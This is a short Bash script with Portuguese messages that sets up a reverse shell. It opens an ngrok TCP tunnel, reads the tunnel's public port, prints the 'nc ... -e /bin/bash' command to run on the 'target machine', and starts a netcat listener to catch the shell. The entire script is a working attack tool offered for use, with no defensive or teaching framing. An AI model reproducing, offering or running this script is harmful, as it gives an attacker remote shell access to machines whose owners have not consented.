echo "O schell apenas funciona no GNOME! Não peça suporte se não estiver usando ele."
read -p "Pressione Enter para continuar... " b
read -p "Insira a porta para fazer o reverse shell: " port
gnome-terminal -- bash -c "ngrok tcp $port; exec bash"
NGROK_PORT=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | awk -F ':' '{print $NF}')
echo "Rode na máquina alvo: nc 0.tcp.sa.ngrok.io $NGROK_PORT -e /bin/bash"
nc -lvp $port
